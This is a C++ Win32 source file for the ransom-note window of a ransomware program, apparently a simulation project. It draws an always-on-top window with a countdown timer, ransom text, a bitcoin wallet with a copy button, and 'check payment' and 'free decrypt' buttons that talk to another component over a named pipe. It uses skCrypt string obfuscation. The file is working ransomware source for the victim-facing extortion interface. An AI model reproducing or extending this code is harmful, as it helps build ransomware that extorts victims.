#include "Window.hpp"
#include "..\include\include.hpp"
#include "resource.h"
#include "localization.hpp"
#include <stdexcept>
#include <string.h>
#include <Richedit.h>

/*
    [Most awful part of the project]
    This is the main window class that handles all the GUI elements.
*/

namespace fs = std::filesystem;
using namespace gui;
using namespace std::chrono;

static HINSTANCE hInstRichEdit = NULL;
static bool windowCreated = false;
static bool isCustomCursor = false;

#define GET_TEXT(text) Localization::getInstance().getText(text)

LRESULT CALLBACK gui::Window::WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
    switch (uMsg)
    {
    case WM_CREATE:
    {
        SetTimer(hwnd, UINT(Window::Widget::TIMER_UPDATE), 1010, NULL);
    } break;
    case WM_TIMER:
    {
        if (wParam == UINT(Window::Widget::TIMER_UPDATE))
        {
			Window::getInstance().updateTimer();
		}
    } break;
    case WM_COMMAND:
    {
        int wmId = LOWORD(wParam);
        int wmEvent = HIWORD(wParam);

        if (wmId == (UINT)Widget::HYPERLINK_WHAT_IS_BTC and wmEvent == STN_CLICKED)
        {
            ShellExecute(NULL, L"open", GET_TEXT(Localization::Text::LINK_1), NULL, NULL, SW_SHOWNORMAL);
            DBG_PRINT("Hyperlink: opening link: %ls", GET_TEXT(Localization::Text::LINK_1));
        }
        else if (wmId == (UINT)Widget::HYPERLINK_HOW_TO_BUY and wmEvent == STN_CLICKED)
        {
            ShellExecute(NULL, L"open", GET_TEXT(Localization::Text::LINK_2), NULL, NULL, SW_SHOWNORMAL);
            DBG_PRINT("Hyperlink: opening link: %ls", GET_TEXT(Localization::Text::LINK_2));
        }

        switch (wmId)
        {

        // Always true for simulation purposes
        case (UINT)Widget::CHECK_PAYMENT_BUTTON:
        {
            DBG_PRINT("***Button: CHECK_PAYMENT_BUTTON");

            const char* data = skCrypt("PAYMENT_RECEIVED");
            DWORD bytesWritten = 0;
            if (Window::getInstance().m_comsClient->writeData(data, DWORD(strlen(data) + 1), bytesWritten))
            {
                DBG_PRINT("Msg sent: %s", data);
            }

        } break;

        // Works only once 
        case (UINT)Widget::FREE_DECRYPT_BUTTON:
        {
            DBG_PRINT("***Button: FREE_DECRYPT_BUTTON");

            const char* data = skCrypt("FREE_DECRYPT");
            DWORD bytesWritten = 0;
            if (Window::getInstance().m_comsClient->writeData(data, DWORD(strlen(data) + 1), bytesWritten))
            {
                DBG_PRINT("Msg sent: %s", data);
            }

        } break;
        case (UINT)Widget::COPY_BUTTON:
        {
			DBG_PRINT("Button: COPY_BUTTON");

            std::wstring textToCopy = GET_TEXT(Localization::Text::BTC_WALLET);
            if (OpenClipboard(hwnd))
            {
                EmptyClipboard();
                HGLOBAL hGlob = GlobalAlloc(GMEM_MOVEABLE, (textToCopy.size() + 1) * sizeof(wchar_t));
                if (hGlob != NULL)
                {
                    void* pGlob = GlobalLock(hGlob);
                    if (pGlob != NULL)
                    {
                        memcpy(pGlob, textToCopy.c_str(), (textToCopy.size() + 1) * sizeof(wchar_t));
                        GlobalUnlock(hGlob);
                        SetClipboardData(CF_UNICODETEXT, hGlob);
                    }
                    else GlobalFree(hGlob);
                }
                CloseClipboard();
            }
		} break;
        case (UINT)Widget::LANGUAGE_LIST_BOX:
        {
            if (wmEvent == CBN_SELCHANGE)
            {
                auto& window = Window::getInstance();
                auto selectedItemIndex = SendMessage(window.m_widgets[Widget::LANGUAGE_LIST_BOX], CB_GETCURSEL, 0, 0);
                
                if (Localization::getInstance().setLanguage(Localization::Language(selectedItemIndex + 1)))
                {
                    //Redraw all widgets
                    for (auto& w : window.m_widgets)
                        DestroyWindow(w.second);

                    window.m_widgets.clear();

                    window.drawWidgets();
                    SendMessage(window.m_widgets[Widget::LANGUAGE_LIST_BOX], CB_SETCURSEL, (WPARAM)selectedItemIndex, 0);

                    InvalidateRect(hwnd, NULL, TRUE);
                    UpdateWindow(hwnd);
                }
                
#ifdef _DEBUG
                WCHAR selectedLanguage[50];
                SendMessage(window.m_widgets[Widget::LANGUAGE_LIST_BOX], CB_GETLBTEXT, selectedItemIndex, (LPARAM)selectedLanguage);
                DBG_PRINT("Selected language: %ls, id: %d", selectedLanguage, int(selectedItemIndex));
#endif
            }
        } break;
        }
    } break;

    case WM_CTLCOLORSTATIC: 
    {
        HDC hdcStatic = (HDC)wParam;
        SetTextColor(hdcStatic, RGB(255, 255, 255));
        SetBkMode(hdcStatic, TRANSPARENT);
        return (INT_PTR)GetStockObject(NULL_BRUSH);
    } break;

    case WM_PAINT:
    {
        auto& window = Window::getInstance();

        //Logos
        PAINTSTRUCT ps;
        HDC hdc = BeginPaint(hwnd, &ps);
        window.drawImage(hdc, Bitmap::LOGO, -14, 0, 1.f);
        window.drawImage(hdc, Bitmap::BITCOIN, 200, 50 + 300 + 10 + 25 / 2);
        window.drawImage(hdc, Bitmap::BITCOIN, 200 + 675 - 128, 50 + 300 + 10 + 25 / 2);
        EndPaint(hwnd, &ps);

        //Timer rect
        window.drawRect(
            10, 
            220, 
            180, 
            130,
			RGB(255, 255, 255));
        window.drawText(GET_TEXT(Localization::Text::RANSOM_TIMER_1),
            10 + 180 / 2,
            460,
            Fonts::TEXT, RGB(228, 244, 0), true); //yellow
        window.drawText(GET_TEXT(Localization::Text::RANSOM_TIMER_2),
            10 + 180 / 2,
            500,
            Fonts::TEXT, RGB(228, 244, 0), true); //yellow
        window.drawText(GET_TEXT(Localization::Text::RANSOM_TIMER_3),
            10 + 180 / 2,
            615,
            Fonts::LABEL, RGB(228, 244, 0), true); //yellow

        //BTC rect
        window.drawRect(
            200, 
            50 + 300 + 10, 
            675, 
            45 + 25, 
            RGB(255, 255, 255));
        window.drawText(GET_TEXT(Localization::Text::RANSOM),
            200 + 128 + 10, 
            675 + 48, 
            Fonts::TEXT, RGB(228, 244, 0)); //yellow
        window.drawRect(
            200 + 128 + 10, 
            50 + 300 + 40, 
            350 + 50, 
            35, 
            RGB(255, 255, 255));
        window.drawText(GET_TEXT(Localization::Text::BTC_WALLET),
            200 + 128 + 20, 
            675 + 40 + 40 + 30, 
            Fonts::TEXT, RGB(255, 255, 255));

        //Links
        window.drawText(GET_TEXT(Localization::Text::HYPERLINK_1),
            10, 
            (50 + 300 + 80) * 2 - 90,
            Fonts::HYPERLINK, RGB(70, 70, 255));
        window.drawText(GET_TEXT(Localization::Text::HYPERLINK_2),
            10,
            (50 + 300 + 80) * 2 - 10,
            Fonts::HYPERLINK, RGB(70, 70, 255));

    } break;

    case WM_CLOSE: DestroyWindow(hwnd); break;

    case WM_DESTROY: PostQuitMessage(0); break;
    }

    return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

HFONT gui::Window::createFont(const std::wstring& fontName, int height, int weight, bool italic, bool strikeout, bool underline)
{
    return CreateFontW(
        height, 0, 0, 0,
        weight, (DWORD)italic, (DWORD)underline, (DWORD)strikeout,
        ANSI_CHARSET, OUT_DEFAULT_PRECIS,
        CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY,
        DEFAULT_PITCH | FF_DONTCARE, fontName.c_str());
}

std::wstring gui::Window::timeToString(const std::chrono::seconds& time)
{
    auto days = static_cast<int>(std::chrono::duration_cast<std::chrono::days>(time).count());
    auto hours = static_cast<int>(std::chrono::duration_cast<std::chrono::hours>(time % std::chrono::days(1)).count());
    auto minutes = static_cast<int>(std::chrono::duration_cast<std::chrono::minutes>(time % std::chrono::hours(1)).count());
    auto seconds = static_cast<int>(std::chrono::duration_cast<std::chrono::seconds>(time % std::chrono::minutes(1)).count());

    std::wstring result;
    result.reserve(11);

    wsprintf(&result[0], L"%02d:%02d:%02d:%02d", days, hours, minutes, seconds);
    return result;
}

void gui::Window::updateTimer()
{
    auto remainingTime = duration_cast<seconds>(m_endTime - steady_clock::now());
    auto countdownText = timeToString(remainingTime);

    if (remainingTime.count() <= 0) 
    {
        DBG_PRINT("Timer stopped!");
        SetWindowText(GetDlgItem(m_window, int(Widget::TIMER)), countdownText.c_str());
        RECT rect;
        GetClientRect(m_window, &rect);
        InvalidateRect(m_window, &rect, TRUE);
        KillTimer(m_window, UINT(Widget::TIMER_UPDATE));
        return;
    }

    SetWindowText(GetDlgItem(m_window, int(Widget::TIMER)), countdownText.c_str());
    RECT rect{ 10, 280, 10 + 180, 280 + 30 };
    InvalidateRect(m_window, &rect, TRUE);
}

void gui::Window::drawLabel()
{
    m_widgets[Widget::LABEL] = CreateWindow(L"STATIC", GET_TEXT(Localization::Text::TITLE),
        WS_CHILD | WS_VISIBLE | SS_CENTER,
        150, 10, 610, 30,
        m_window, nullptr, m_windowClass.hInstance, nullptr);
    SendMessage(m_widgets[Widget::LABEL], WM_SETFONT, WPARAM(m_fonts[Fonts::LABEL]), TRUE);
}

void gui::Window::drawTimer()
{
    m_widgets[Widget::TIMER] = CreateWindow(L"STATIC", timeToString(m_expirationTime).c_str(),
        WS_CHILD | WS_VISIBLE | SS_CENTER,
        10, 280, 180, 30,
        m_window, (HMENU)Widget::TIMER, m_windowClass.hInstance, nullptr);
    SendMessage(m_widgets[Widget::TIMER], WM_SETFONT, WPARAM(m_fonts[Fonts::TIMER]), TRUE);
}

void gui::Window::drawLinks()
{
    m_widgets[Widget::HYPERLINK_WHAT_IS_BTC] = CreateWindow(
        L"STATIC",
        L"",
        WS_VISIBLE | WS_CHILD | SS_NOTIFY,
        10, 50 + 300 + 40, 180, 30,
        m_window, (HMENU)Widget::HYPERLINK_WHAT_IS_BTC,
        m_windowClass.hInstance,
        NULL);
    SendMessage(m_widgets[Widget::HYPERLINK_WHAT_IS_BTC], WM_SETFONT, WPARAM(m_fonts[Fonts::HYPERLINK]), TRUE);

    m_widgets[Widget::HYPERLINK_HOW_TO_BUY] = CreateWindow(
        L"STATIC",
        L"",
        WS_VISIBLE | WS_CHILD | SS_NOTIFY,
        10, 50 + 300 + 80, 200, 30,
        m_window, (HMENU)Widget::HYPERLINK_HOW_TO_BUY,
        m_windowClass.hInstance,
        NULL);
    SendMessage(m_widgets[Widget::HYPERLINK_HOW_TO_BUY], WM_SETFONT, WPARAM(m_fonts[Fonts::HYPERLINK]), TRUE);
}

void gui::Window::drawRichText()
{
    m_widgets[Widget::TEXT_BOX] = CreateWindowEx(
        WS_EX_CLIENTEDGE,
        MSFTEDIT_CLASS,
        L"",
        WS_CHILD | WS_VISIBLE | WS_VSCROLL | ES_MULTILINE | ES_AUTOVSCROLL | ES_READONLY,
        200, 50, 675, 300,
        m_window,
        nullptr,
        m_windowClass.hInstance,
        nullptr);

    auto& hwnd = m_widgets[Widget::TEXT_BOX];

    SendMessage(hwnd, WM_SETFONT, WPARAM(m_fonts[Fonts::TEXT_BOX]), TRUE);

    CHARFORMAT2 cf;
    ZeroMemory(&cf, sizeof(cf));
    cf.cbSize = sizeof(cf);
    cf.dwMask = CFM_BOLD | CFM_SIZE | CFM_FACE;
    cf.dwEffects = CFE_BOLD | CFE_ITALIC;
    cf.yHeight = 16 * 20;
    wcscpy_s(cf.szFaceName, L"Tahoma");

    auto setText = [&](const std::wstring& text, bool header, bool newLine) -> void
    {
        if (header)
        {
            cf.dwEffects = CFE_BOLD | CFE_ITALIC;
            cf.yHeight = 18 * 20;
        }
        else
        {
            cf.dwEffects = CFE_ITALIC;
            cf.yHeight = 12 * 20;
        }

		SendMessage(hwnd, EM_SETCHARFORMAT, SCF_SELECTION, (LPARAM)&cf);
		SendMessage(hwnd, EM_REPLACESEL, FALSE, (LPARAM)text.c_str());
		if (newLine)
			SendMessage(hwnd, EM_REPLACESEL, FALSE, (LPARAM)L"\r\n");
	};

    setText(GET_TEXT(Localization::Text::HEADER), true, true);
    setText(GET_TEXT(Localization::Text::PLACEHOLDER), false, true);
    SendMessage(hwnd, EM_REPLACESEL, FALSE, (LPARAM)L"\r\n");

    setText(GET_TEXT(Localization::Text::HEADER2), true, true);
    setText(GET_TEXT(Localization::Text::PLACEHOLDER2), false, true);
    SendMessage(hwnd, EM_REPLACESEL, FALSE, (LPARAM)L"\r\n");

    setText(GET_TEXT(Localization::Text::HEADER3), true, true);
    setText(GET_TEXT(Localization::Text::PLACEHOLDER3), false, false);
}

void gui::Window::drawListBox()
{
    m_widgets[Widget::LANGUAGE_LIST_BOX] = CreateWindowEx(
        0,
        L"COMBOBOX",
        L"",
        CBS_DROPDOWNLIST | WS_CHILD | WS_VISIBLE | WS_TABSTOP | WS_VSCROLL,
        200 + 450 + 134, 10 + 5, 90, 300,
        m_window,
        (HMENU)Widget::LANGUAGE_LIST_BOX,
        m_windowClass.hInstance,
        nullptr);

    auto& listBoxWnd = m_widgets[Widget::LANGUAGE_LIST_BOX];

    SendMessage(listBoxWnd, CB_ADDSTRING, 0, (LPARAM)L"English");
    SendMessage(listBoxWnd, CB_ADDSTRING, 0, (LPARAM)L"Polish");
    SendMessage(listBoxWnd, CB_ADDSTRING, 0, (LPARAM)L"Spanish");
    SendMessage(listBoxWnd, CB_ADDSTRING, 0, (LPARAM)L"French");
    SendMessage(listBoxWnd, CB_ADDSTRING, 0, (LPARAM)L"German");
    SendMessage(listBoxWnd, CB_ADDSTRING, 0, (LPARAM)L"Russian");

    SendMessage(listBoxWnd, CB_SETCURSEL, (WPARAM)0, 0);
}

void gui::Window::drawButtons()
{
    m_widgets[Widget::FREE_DECRYPT_BUTTON] = CreateWindow(L"BUTTON", GET_TEXT(Localization::Text::BUTTON_FREE),
        WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
        200, 50 + 300 + 10 + 45 + 10 + 25, 320, 30,
        m_window, (HMENU)Widget::FREE_DECRYPT_BUTTON, m_windowClass.hInstance, nullptr);
    SendMessage(m_widgets[Widget::FREE_DECRYPT_BUTTON], WM_SETFONT, WPARAM(m_fonts[Fonts::BUTTON]), TRUE);

    m_widgets[Widget::CHECK_PAYMENT_BUTTON] = CreateWindow(L"BUTTON", GET_TEXT(Localization::Text::BUTTON_CHECK),
        WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
        200 + 150 + 50 + 150 + 5, 50 + 300 + 10 + 45 + 10 + 25, 320, 30,
        m_window, (HMENU)Widget::CHECK_PAYMENT_BUTTON, m_windowClass.hInstance, nullptr);
    SendMessage(m_widgets[Widget::CHECK_PAYMENT_BUTTON], WM_SETFONT, WPARAM(m_fonts[Fonts::BUTTON]), TRUE);

    m_widgets[Widget::COPY_BUTTON] = CreateWindow(L"BUTTON", GET_TEXT(Localization::Text::BUTTON_COPY),
        WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
        200 + 150 + 300 + 25, 50 + 300 + 45, 60, 25,
        m_window, (HMENU)Widget::COPY_BUTTON, m_windowClass.hInstance, nullptr);
    SendMessage(m_widgets[Widget::COPY_BUTTON], WM_SETFONT, WPARAM(m_fonts[Fonts::BUTTON]), TRUE);

}

void gui::Window::drawImage(HDC hdc, const Bitmap& bitmap, int x, int y, float scale, int w, int h)
{
    BITMAP _bitmap;
    const auto& srcImg = m_bitmaps[bitmap];
    size_t memSize = sizeof(srcImg);
    HDC hdcMem = CreateCompatibleDC(hdc);
    
    SelectObject(hdcMem, srcImg);
    GetObject(srcImg, sizeof(_bitmap), &_bitmap);

    if (w <= 0) w = _bitmap.bmWidth;
    if (h <= 0) h = _bitmap.bmHeight;

    int scaledWidth = static_cast<int>(w * scale);
    int scaledHeight = static_cast<int>(h * scale);

    StretchBlt(hdc, x, y, scaledWidth, scaledHeight, hdcMem, 0, 0, _bitmap.bmWidth, _bitmap.bmHeight, SRCCOPY);

    DeleteDC(hdcMem);
}

void gui::Window::drawRect(int x, int y, int w, int h, COLORREF color, bool solid)
{
    HDC hdc = GetDC(m_window);

    HBRUSH hBrush = CreateSolidBrush(color);

    SelectObject(hdc, hBrush);

    RECT rect{ x, y, x + w, y + h };
    solid ? Rectangle(hdc, x, y, x + w, y + h) : FrameRect(hdc, &rect, hBrush);

    DeleteObject(hBrush);
    ReleaseDC(m_window, hdc);
}

void gui::Window::drawText(const std::wstring& text, int x, int y, const Fonts& font, COLORREF color, bool center)
{
    HDC hdc = GetDC(m_window);
    HFONT oldFont = (HFONT)SelectObject(hdc, m_fonts[font]);

    SetTextColor(hdc, color);
    SetBkMode(hdc, TRANSPARENT);

    SIZE size;
    GetTextExtentPoint32(hdc, text.c_str(), lstrlenW(text.c_str()), &size);
    RECT rect = { x, y, (LONG)m_windowSize[0], size.cy + 8};
    DWORD flags = DT_LEFT | DT_SINGLELINE | DT_VCENTER;
    if (center)
    {
		rect.left = x - size.cx / 2;
		rect.right = x + size.cx / 2;
		flags = DT_CENTER | DT_SINGLELINE | DT_VCENTER;
	}
    DrawText(hdc, text.c_str(), -1, &rect, flags);

    SelectObject(hdc, oldFont);
    ReleaseDC(m_window, hdc);
}

void gui::Window::createImages()
{
    m_bitmaps[Bitmap::LOGO] = LoadBitmap(GetModuleHandleA(NULL), MAKEINTRESOURCE(IDB_BITMAP2));
    m_bitmaps[Bitmap::BITCOIN] = LoadBitmap(GetModuleHandleA(NULL), MAKEINTRESOURCE(IDB_BITMAP1));
}

RECT gui::Window::getWidgetRect(const Widget& widget)
{
    RECT rect;
    HWND hCtrl = GetDlgItem(m_window, int(widget));
    GetWindowRect(hCtrl, &rect);
    ScreenToClient(m_window, (LPPOINT)&rect.left);
    ScreenToClient(m_window, (LPPOINT)&rect.right);
    return rect;
}

void gui::Window::drawWidgets()
{
    drawLabel();
    drawRichText();
    drawListBox();
    drawButtons();
    drawTimer();
    drawLinks();
}

gui::Window::Window()
{
    m_comsClient = std::make_unique<NamedPipeClient>("RAwarePipeComs");

    try
    {
        createWindow();
    }
    catch (const std::exception& e)
    {
		DBG_PRINT("%s", e.what());
        throw e;
	}
}

gui::Window::~Window()
{
	for (auto& font : m_fonts)
		DeleteObject(font.second);

    for (auto& bitmap : m_bitmaps)
        DeleteObject(bitmap.second);

    KillTimer(m_window, UINT(Widget::TIMER_UPDATE));
    DeleteObject(m_bgBrush);
	DestroyWindow(m_window);
	UnregisterClass(m_label.c_str(), m_windowClass.hInstance);

    FreeLibrary(hInstRichEdit);
}

void gui::Window::show()
{
    ShowWindow(m_window, SW_SHOWDEFAULT);
    UpdateWindow(m_window);

    MSG msg{};
    while (GetMessage(&msg, NULL, 0, 0)) 
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
}

void gui::Window::createWindow()
{
    m_endTime = steady_clock::now() + m_expirationTime;
    m_bgBrush = CreateSolidBrush(m_bgColor);
    m_windowClass = 
    {
        .cbSize = sizeof(WNDCLASSEX),
        .style = CS_CLASSDC,
        .lpfnWndProc = WindowProc,
        .cbClsExtra = 0L,
        .cbWndExtra = 0L,
        .hInstance = GetModuleHandle(NULL),
        .hIcon = LoadIcon(NULL, IDI_APPLICATION),
        .hCursor = LoadCursor(NULL, IDC_ARROW),
        .hbrBackground = m_bgBrush,
        .lpszMenuName = NULL,
        .lpszClassName = m_label.c_str(),
        .hIconSm = LoadIcon(NULL, IDI_APPLICATION)
    };

    if (!RegisterClassEx(&m_windowClass))
        throw std::runtime_error("Failed to register window class.");

    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);

    if (screenWidth <= 0 || screenHeight <= 0)
        throw std::runtime_error("Invalid screen size.");

    int windowPosX = (screenWidth / 2) - (m_windowSize[0] / 2);
    int windowPosY = (screenHeight / 2) - (m_windowSize[1] / 2);

    DWORD windowStyle = WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU;
    m_window = CreateWindowEx(
        WS_EX_TOPMOST,
        m_windowClass.lpszClassName,
        m_label.c_str(),
        windowStyle, //pos
        windowPosX, windowPosY, //size
        m_windowSize[0], m_windowSize[1],
        NULL, NULL, m_windowClass.hInstance, NULL);

    if (not m_window)
        throw std::runtime_error("Failed to create window.");

    m_fonts[Fonts::TIMER] = createFont(L"Sagoe UI", 36, FW_NORMAL, false, false, true);
    m_fonts[Fonts::LABEL] = createFont(L"Tahoma", 32, FW_EXTRABOLD);
    m_fonts[Fonts::TEXT_BOX] = createFont(L"Tahoma", 16, FW_LIGHT);
    m_fonts[Fonts::BUTTON] = createFont(L"Tahoma", 14, FW_EXTRABOLD);
    m_fonts[Fonts::TEXT] = createFont(L"Tahoma", 18, FW_HEAVY);
    m_fonts[Fonts::HYPERLINK] = createFont(L"Aharoni", 20, FW_HEAVY, false, false, true);

    createImages();

    for (auto& font : m_fonts)
    {
		if (!font.second)
			throw std::runtime_error("Failed to create font.");
	}

    hInstRichEdit = LoadLibrary(L"Msftedit.dll");
    if (hInstRichEdit == NULL) 
        throw std::runtime_error("Failed to load Msftedit library.");

    drawWidgets();

    windowCreated = true;

    if (not m_comsClient->connect())
        throw std::runtime_error("Failed to connect to the named pipe");
}
